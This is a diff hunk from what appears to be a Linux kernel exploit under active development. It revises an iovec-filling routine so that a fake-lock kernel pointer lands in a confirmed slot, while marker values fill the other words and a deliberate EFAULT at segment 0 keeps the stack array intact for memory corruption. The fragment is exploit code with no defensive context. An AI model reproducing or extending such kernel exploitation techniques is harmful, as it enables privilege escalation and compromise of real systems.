@@ -257,10 +257,18 @@ static void overlay_fill_iovec(struct iovec *iv, int n, int base_word) {
      word 13 carries the fake-lock kernel pointer as a raw len value.
      Word 0 (iov[0].base) = kernel ptr so validation dies at seg 0 with
      EFAULT right after the copy - the stack array stays intact. */
-  memset(iv, 0, sizeof(*iv) * (size_t)n);
-  iv[6].iov_len = overlay_word_value(7);                 /* W->lock */
-  iv[0].iov_base = (void *)0xffffffc000000000ULL;        /* EFAULT at seg0 */
-  iv[0].iov_len = 8;
+  /* v34: replicate the PROVEN marker configuration exactly, but word 13
+     (the confirmed W+0x38 landing slot) carries the real fake_lock. All
+     other words stay markers; validation dies at seg0 (EFAULT) exactly
+     like the proven poison runs - stack array survives identically. */
+  for (int j = 0; j < 2 * n; j++) {
+    uint64_t marker = 0x5300000000000000ULL | ((uint64_t)j << 8);
+    if (j & 1)
+      iv[j / 2].iov_len = marker;
+    else
+      iv[j / 2].iov_base = (void *)marker;
+  }
+  iv[6].iov_len = overlay_word_value(7);  /* word13 = REAL fake_lock */
 }
 
 static void overlay_fill_words(char *buf, size_t bytes, int base_word) {
